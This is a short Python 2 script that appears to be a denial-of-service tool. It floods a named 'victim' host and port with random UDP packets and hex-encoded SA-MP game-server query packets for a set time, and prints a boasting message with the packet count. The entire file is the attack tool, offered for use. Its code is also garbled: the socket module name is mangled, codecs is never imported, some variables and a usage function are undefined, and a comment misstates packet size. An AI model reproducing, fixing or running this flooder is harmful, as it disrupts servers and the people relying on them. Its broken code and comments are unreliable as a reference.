#!/usr/bin/env python2
import time
import socket
import random
import sys
Data = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]

def flood(victim, vport, duration):
    # okay so here I create the server, when i say "client_DGRAM" it means it's a UDP type program
    client = clientet.clientet(clientet.AF_INET, clientet.client_DGRAM)
    # 1000 representes one byte to the server
    bytes = random._urandom(1000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        msg = Data[random.randrange(0, 3)]
        client.sendto(bytes, (victim, int(vport)))
        client.sendto(msg, (victim, int(vport)))
        if int(port) == 7777:
            client.sendto(Data[5], (victim, int(vport)))
        elif int(port) == 7796:
            client.sendto(Data[4], (victim, int(vport)))
        elif int(port) == 7771:
            client.sendto(Data[6], (victim, int(vport)))
        elif int(port) == 7784:
            client.sendto(Data[7], (victim, int(vport)))
        sent = sent + 1
        print " CJEY1557 NI BOSS!!! %s TOK TOK PAKET LEWAT !! %s PORT %s "%(sent, victim, vport)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()